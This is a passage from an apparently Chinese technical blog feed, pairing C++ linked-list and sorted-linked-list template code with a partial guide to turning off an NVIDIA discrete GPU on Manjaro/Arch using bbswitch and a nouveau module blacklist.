class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> once</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">chainNode</span>&#123;</span><br>    T data;<br>    chainNode* next;<br>    <span class="hljs-built_in">chainNode</span>()&#123;&#125;<br>    <span class="hljs-built_in">chainNode</span>(<span class="hljs-keyword">const</span> T &amp;data)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;data=data;<br>        <span class="hljs-keyword">this</span>-&gt;next=<span class="hljs-literal">nullptr</span>;<br>    &#125;<br>    <span class="hljs-built_in">chainNode</span>(<span class="hljs-keyword">const</span> T &amp;data,chainNode*next)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;data=data;<br>        <span class="hljs-keyword">this</span>-&gt;next=next;<br>    &#125;<br>&#125;;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LinkedList</span>&#123;</span><br><span class="hljs-keyword">protected</span>:<br>    chainNode&lt;T&gt;*m_Header;<br>    <span class="hljs-keyword">int</span> m_size;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">LinkedList</span>();<br>    <span class="hljs-built_in">LinkedList</span>(<span class="hljs-keyword">const</span> T&amp;);<br>    <span class="hljs-comment">// 拷贝构造函数</span><br>    <span class="hljs-built_in">LinkedList</span>(<span class="hljs-keyword">const</span> LinkedList&lt;T&gt;&amp;);<br>    <span class="hljs-comment">// 移动构造函数</span><br>    <span class="hljs-built_in">LinkedList</span>(LinkedList&lt;T&gt;&amp;&amp;);<br>    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">LinkedList</span>();<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-keyword">int</span>,<span class="hljs-keyword">const</span> T&amp;)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">append</span><span class="hljs-params">(<span class="hljs-keyword">const</span> T&amp;)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eraseByIndex</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br>    <span class="hljs-comment">// 删除所有元素为T的节点</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">erase</span><span class="hljs-params">(<span class="hljs-keyword">const</span> T&amp;)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clearAll</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">empty</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-comment">// 返回首次出现的节点索引</span><br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">indexOf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> T&amp;)</span></span>;<br>    <span class="hljs-function">T &amp;<span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br>    <span class="hljs-function">chainNode&lt;T&gt;*<span class="hljs-title">getFirstchainNode</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function">chainNode&lt;T&gt;*<span class="hljs-title">getLastchainNode</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">outputLinkedList</span><span class="hljs-params">()</span></span>;<br>&#125;;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br>LinkedList&lt;T&gt;::<span class="hljs-built_in">LinkedList</span>()&#123;<br>    m_Header=<span class="hljs-literal">nullptr</span>;<br>    m_size=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br>LinkedList&lt;T&gt;::<span class="hljs-built_in">LinkedList</span>(<span class="hljs-keyword">const</span> T&amp;data)&#123;<br>    m_Header=<span class="hljs-keyword">new</span> chainNode&lt;T&gt;(data);<br>    m_size=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">// 拷贝构造函数-&gt;深拷贝</span><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br>LinkedList&lt;T&gt;::<span class="hljs-built_in">LinkedList</span>(<span class="hljs-keyword">const</span> LinkedList&lt;T&gt;&amp;ll)&#123;<br>    <span class="hljs-keyword">if</span>(ll.m_Header==<span class="hljs-literal">nullptr</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-built_in">runtime_error</span>(<span class="hljs-string">&quot;The source object can not nullptr!&quot;</span>);<br>    <span class="hljs-keyword">this</span>-&gt;m_size=ll.m_size;<br>    <span class="hljs-comment">// 构建头节点</span><br>    <span class="hljs-keyword">this</span>-&gt;m_Header=<span class="hljs-keyword">new</span> chainNode&lt;T&gt;(ll.m_Header-&gt;data);<br>    chainNode&lt;T&gt;*pNodeSource=ll.m_Header-&gt;next;<br>    chainNode&lt;T&gt;*pNodeTarget=<span class="hljs-keyword">this</span>-&gt;m_Header;<br>    <span class="hljs-comment">// 从源链表的头结点的下一个节点开始逐个复制</span><br>    <span class="hljs-keyword">while</span> (pNodeSource)&#123;<br>        pNodeTarget-&gt;next=<span class="hljs-keyword">new</span> chainNode&lt;T&gt;(pNodeSource-&gt;data);<br>        pNodeSource=pNodeSource-&gt;next;<br>        pNodeTarget=pNodeTarget-&gt;next;<br>    &#125;<br>    pNodeTarget-&gt;next=<span class="hljs-literal">nullptr</span>;<br>&#125;<br><br><span class="hljs-comment">// 移动构造函数-&gt;浅拷贝</span><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br>LinkedList&lt;T&gt;::<span class="hljs-built_in">LinkedList</span>(LinkedList&lt;T&gt;&amp;&amp;ll)&#123;<br>    <span class="hljs-keyword">this</span>-&gt;m_size=ll.m_size;<br>    <span class="hljs-keyword">this</span>-&gt;m_Header=ll.m_Header;<br>    <span class="hljs-comment">// 禁止内存区域共享</span><br>    ll.m_Header=<span class="hljs-literal">nullptr</span>;<br>&#125;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br>LinkedList&lt;T&gt;::~<span class="hljs-built_in">LinkedList</span>()&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;m_Header)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">clearAll</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">void</span> LinkedList&lt;T&gt;::<span class="hljs-built_in">insert</span>(<span class="hljs-keyword">int</span> theIndex,<span class="hljs-keyword">const</span> T&amp;data)&#123;<br>    <span class="hljs-keyword">if</span>(theIndex&lt;<span class="hljs-number">0</span>||theIndex&gt;=m_size)<span class="hljs-keyword">return</span>;    <br>    <span class="hljs-comment">// 新建头节点</span><br>    <span class="hljs-keyword">if</span>(theIndex==<span class="hljs-number">0</span>&amp;&amp;m_Header==<span class="hljs-literal">nullptr</span>)&#123;<br>        m_Header=<span class="hljs-keyword">new</span> chainNode&lt;T&gt;(data);<br>        m_size++;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        chainNode&lt;T&gt;*pNode=m_Header;<br>        <span class="hljs-keyword">int</span> index=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (pNode)&#123;<br>            <span class="hljs-comment">// 在 theIndex之后 插入节点</span><br>            <span class="hljs-keyword">if</span>(index==theIndex)&#123;<br>                pNode-&gt;next=<span class="hljs-keyword">new</span> chainNode&lt;T&gt;(data,pNode-&gt;next);<br>				<span class="hljs-comment">// auto p=new chainNode&lt;T&gt;(data);</span><br>                <span class="hljs-comment">// p-&gt;next=pNode-&gt;next;</span><br>                <span class="hljs-comment">// pNode-&gt;next=p;</span><br>                m_size++;<br>            &#125;<br>            index++;<br>            pNode=pNode-&gt;next;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">void</span> LinkedList&lt;T&gt;::<span class="hljs-built_in">append</span>(<span class="hljs-keyword">const</span> T&amp;data)&#123;<br>    chainNode&lt;T&gt;*pNode=m_Header;<br>    <span class="hljs-keyword">while</span> (pNode-&gt;next)&#123;<br>        pNode=pNode-&gt;next;   <br>    &#125;<br>    pNode-&gt;next=<span class="hljs-keyword">new</span> chainNode&lt;T&gt;(data);<br>    <span class="hljs-keyword">this</span>-&gt;m_size++;<br>&#125;   <br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">void</span> LinkedList&lt;T&gt;::<span class="hljs-built_in">clearAll</span>()&#123;<br>    <span class="hljs-keyword">while</span> (m_Header)&#123;<br>        chainNode&lt;T&gt;*pNextNode=m_Header-&gt;next;<br>        <span class="hljs-keyword">delete</span> m_Header;<br>        m_Header=<span class="hljs-literal">nullptr</span>;<br>        m_Header=pNextNode;<br>    &#125;<br>    m_Header=<span class="hljs-literal">nullptr</span>;<br>    m_size=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">void</span> LinkedList&lt;T&gt;::<span class="hljs-built_in">eraseByIndex</span>(<span class="hljs-keyword">int</span> theIndex)&#123;<br>    <span class="hljs-keyword">if</span>(theIndex&lt;<span class="hljs-number">0</span>||theIndex&gt;=m_size)<span class="hljs-keyword">return</span>;    <br>    chainNode&lt;T&gt;*deletedNode=<span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-comment">// 处理删除头节点情况，因为单向链表头结点无前驱节点</span><br>    <span class="hljs-keyword">if</span>(theIndex==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-comment">// 将 m_Header 标记为删除</span><br>        deletedNode = m_Header;<br>        m_Header=m_Header-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        chainNode&lt;T&gt;*pNodePre=m_Header;<br>        <span class="hljs-comment">// 找待删除节点的前驱节点</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; theIndex<span class="hljs-number">-1</span>; i++)&#123;<br>            pNodePre=pNodePre-&gt;next;   <br>        &#125;<br>        deletedNode=pNodePre-&gt;next;<br>        pNodePre-&gt;next=deletedNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">delete</span> deletedNode;<br>    deletedNode=<span class="hljs-literal">nullptr</span>;<br>    m_size--;<br>&#125;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">void</span> LinkedList&lt;T&gt;::<span class="hljs-built_in">erase</span>(<span class="hljs-keyword">const</span> T&amp;data)&#123;<br>    chainNode&lt;T&gt;*pNode=m_Header;<br>    chainNode&lt;T&gt;*pNodePre;<br>    <span class="hljs-keyword">while</span> (pNode)&#123;<br>        <span class="hljs-keyword">if</span>(pNode-&gt;data==data)&#123;<br>            <span class="hljs-comment">// 处理删除头结点情况</span><br>            <span class="hljs-keyword">if</span>(pNode==m_Header)&#123;<br>                <span class="hljs-keyword">auto</span> next=m_Header-&gt;next;<br>                <span class="hljs-keyword">delete</span> m_Header;<br>                m_Header=next;<br>                <span class="hljs-comment">// 并使其指向原来头结点的下一个节点</span><br>                pNode=next;<br>                m_size--;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                pNodePre-&gt;next=pNode-&gt;next;<br>                <span class="hljs-keyword">delete</span> pNode;<br>                pNode=pNodePre;<br>                m_size--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 保存前驱节点</span><br>        pNodePre=pNode;<br>        pNode=pNode-&gt;next;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">bool</span> LinkedList&lt;T&gt;::<span class="hljs-built_in">empty</span>()&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>-&gt;m_Header==<span class="hljs-literal">nullptr</span>&amp;&amp;<span class="hljs-keyword">this</span>-&gt;m_size&lt;=<span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">int</span> LinkedList&lt;T&gt;::<span class="hljs-built_in">size</span>()&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>-&gt;m_size;<br>&#125;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">int</span> LinkedList&lt;T&gt;::<span class="hljs-built_in">indexOf</span>(<span class="hljs-keyword">const</span> T&amp;data)&#123;<br>    chainNode&lt;T&gt;*pNode=m_Header;<br>    <span class="hljs-keyword">int</span> index=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (pNode&amp;&amp;pNode-&gt;data!=data)&#123;<br>        index++;<br>        pNode=pNode-&gt;next;<br>    &#125;<br>    <span class="hljs-comment">// 到达尾节点</span><br>    <span class="hljs-keyword">if</span>(pNode==<span class="hljs-literal">nullptr</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> index;    <br>&#125;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br>T &amp;LinkedList&lt;T&gt;::<span class="hljs-built_in">get</span>(<span class="hljs-keyword">int</span> index)&#123;<br>    <span class="hljs-keyword">if</span>(index&lt;<span class="hljs-number">0</span>||index&gt;=m_size)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-built_in">length_error</span>(<span class="hljs-string">&quot;the index is invalid!&quot;</span>);<br>    chainNode&lt;T&gt;*pNode=m_Header;<br>    <span class="hljs-keyword">int</span> count=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (pNode&amp;&amp;index!=count++)&#123;<br>        pNode=pNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> pNode-&gt;data;<br>&#125;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br>chainNode&lt;T&gt;* LinkedList&lt;T&gt;::<span class="hljs-built_in">getFirstchainNode</span>()&#123;<br>    <span class="hljs-keyword">return</span> m_Header;<br>&#125;<br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br>chainNode&lt;T&gt;* LinkedList&lt;T&gt;::<span class="hljs-built_in">getLastchainNode</span>()&#123;<br>    <span class="hljs-keyword">auto</span> p=m_Header;<br>    <span class="hljs-keyword">while</span> (p&amp;&amp;p-&gt;next)&#123;<br>        p=p-&gt;next;   <br>    &#125;<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-keyword">void</span> LinkedList&lt;T&gt;::<span class="hljs-built_in">outputLinkedList</span>()&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;m_Header==<span class="hljs-literal">nullptr</span>)<span class="hljs-keyword">return</span>;<br>    chainNode&lt;T&gt;*pNode=<span class="hljs-keyword">this</span>-&gt;m_Header;<br>    <span class="hljs-keyword">int</span> index=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (pNode)&#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot;[&quot;</span>&lt;&lt;index&lt;&lt;<span class="hljs-string">&quot;] =&gt; &quot;</span>&lt;&lt;pNode-&gt;data&lt;&lt;std::endl;<br>        index++;<br>        pNode=pNode-&gt;next;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>
<h3 id="有序链表"><a class="markdownIt-Anchor" href="#有序链表"></a> 有序链表</h3>
<p>其实我们还可以利用上面的单向链表实现一个简单的有序链表</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> once</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&quot;LinkedList.h&quot;</span></span><br><br><span class="hljs-comment">// 默认升序</span><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>,<span class="hljs-keyword">class</span> <span class="hljs-title">Compare</span>=</span>less&lt;T&gt;&gt;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SortedLinkedList</span>:</span> <span class="hljs-keyword">public</span> LinkedList&lt;T&gt; &#123;<br><span class="hljs-keyword">public</span>: <br>    <span class="hljs-keyword">using</span> LinkedList&lt;T&gt;::LinkedList;<br>    <span class="hljs-keyword">using</span> LinkedList&lt;T&gt;::insert;<br>    ~<span class="hljs-built_in">SortedLinkedList</span>()&#123;&#125;<br>    <span class="hljs-comment">// 子类insert为有序插入</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-keyword">const</span> T&amp;)</span></span>;<br>    <span class="hljs-comment">// 基类insert为无序插入</span><br>&#125;;<br><span class="hljs-comment">// 重载insert()函数</span><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>,<span class="hljs-keyword">class</span> <span class="hljs-title">Compare</span>&gt;</span><br><span class="hljs-keyword">void</span> SortedLinkedList&lt;T,Compare&gt;::<span class="hljs-built_in">insert</span>(<span class="hljs-keyword">const</span> T&amp;data)&#123;<br>    chainNode&lt;T&gt;*pNode=<span class="hljs-keyword">this</span>-&gt;m_Header;<br>    chainNode&lt;T&gt;*pNodePre=<span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-comment">// Compare()(pNode-&gt;data,data) 等价于 pNode-&gt;data &lt; data</span><br>    <span class="hljs-comment">// 找前驱节点</span><br>    <span class="hljs-keyword">while</span> (pNode&amp;&amp;<span class="hljs-built_in">Compare</span>()(pNode-&gt;data,data))&#123;<br>        pNodePre=pNode;<br>        pNode=pNode-&gt;next;<br>    &#125;<br>    <span class="hljs-comment">// 若无前驱节点，那么没有头结点 或者 pNode-&gt;data &gt; data</span><br>    <span class="hljs-keyword">if</span>(pNodePre==<span class="hljs-literal">nullptr</span>)&#123;<br>        <span class="hljs-comment">// 更新头结点</span><br>        <span class="hljs-keyword">this</span>-&gt;m_Header=<span class="hljs-keyword">new</span> chainNode&lt;T&gt;(data,pNode);<br>        <span class="hljs-comment">// 等价于</span><br>        <span class="hljs-comment">// auto p=new chainNode&lt;T&gt;(data);</span><br>        <span class="hljs-comment">// p-&gt;next=pNode; </span><br>        <span class="hljs-comment">// this-&gt;m_Header=p;</span><br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// 插入新节点</span><br>        chainNode&lt;T&gt;*p=<span class="hljs-keyword">new</span> chainNode&lt;T&gt;(data,pNode);<br>        pNodePre-&gt;next=p;<br>        <span class="hljs-comment">// 等价于</span><br>        <span class="hljs-comment">// auto p=new chainNode&lt;T&gt;(data);</span><br>        <span class="hljs-comment">// p-&gt;next=pNode;</span><br>        <span class="hljs-comment">// pNodePre-&gt;next=p;</span><br>    &#125;<br>    <span class="hljs-keyword">this</span>-&gt;m_size++;<br>&#125;   <br></code></pre></div></td></tr></table></figure>
<h3 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h3>
<p>链表元素在内存随机存储的，占用一定的内存空间，且查找速度要慢于顺序表，但在插入和删除方面要优于顺序表。如果有一种数据结构够将两者结合起来，那么就能够充分利用两者的优点，这种数据结构就是跳表和散列表。</p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>DataStructures</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>Manjaro/Arch禁用独显</title>
    <url>/linux-ban-nvidia/</url>
    <content><![CDATA[<p>由于本人笔记本是双显卡的，曾几度尝试安装闭源NVIDIA驱动（为了hashcat），然而每次以失败告终，而系统自带的开源nouveau驱动实在太坑了，系统总是会出现一些莫名其妙的bug，忍无可忍之下干脆禁掉独显，只用核显得了。</p>
<span id="more"></span>
<h3 id="bbswitch"><a class="markdownIt-Anchor" href="#bbswitch"></a> bbswitch</h3>
<p>首先需要安装bbswitch模块，用于切换显卡</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">pacman bbswitch<br><br><span class="hljs-comment"># 加载模块</span><br>modprobe bbswitch<br><span class="hljs-comment"># 卸载模块</span><br>rmmod bbswitch<br></code></pre></div></td></tr></table></figure>
<h3 id="禁用独显"><a class="markdownIt-Anchor" href="#禁用独显"></a> 禁用独显</h3>
<p>首先查看当前系统是否已经禁用独显</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">cat /proc/acpi/bbswitch<br>0000:01:00.0 OFF<br></code></pre></div></td></tr></table></figure>
<p>OFF说明目前已经禁掉独显了，如果不为OFF，那么需要将其关闭</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 关闭独显</span><br>tee /proc/acpi/bbswitch &lt;&lt;&lt; <span class="hljs-string">OFF</span><br><span class="hljs-string"># 打开独显</span><br><span class="hljs-string">tee /proc/acpi/bbswitch &lt;&lt;&lt; ON</span><br></code></pre></div></td></tr></table></figure>
<p>之后还需要告诉系统：modprobe加载bbswitch时关闭独显(load_state=0)，卸载bbswitch时打开独显(unload_state=1)</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nano /etc/modprobe.d/bbswitch.conf<br>options bbswitch load_state=0 unload_state=1<br></code></pre></div></td></tr></table></figure>
<h3 id="nouveau列入blacklist"><a class="markdownIt-Anchor" href="#nouveau列入blacklist"></a> nouveau列入blacklist</h3>
<p>执行<code>tee /proc/acpi/bbswitch &lt;&lt;&lt; OFF</code>后还需要将nouveau列入黑名单，防止它后台运行。<br />
在<code>blacklist.conf</code>添加<code>blacklist nouveau</code>禁用nouveau</p>
<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">nano /etc/modprobe.d/blacklist.conf<br>blacklist nouveau<br></code></pre></div></td></tr></table></figure>
<p>在下一次重启<code>lspci</code>就可以看到<code>rev ff</code>表示独显已经关闭了，或者<code>dmesg|grep -i nouveau</code>查看是否含有nouveau的内容</p>
<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">01:00.0 3D controller: NVIDIA Corporation GP108BM [GeForce MX250] (rev ff)<br></code></pre></div></td></tr></table></figure>
<h3 id="rclocal"><a class="markdownIt-Anchor" href="#rclocal"></a> rc.local</h3>
<p>将以上操作设置一个系统启动服务，这样在每次开机时就能够关闭独显了。基于Archlinux systemd写一个服务</p>
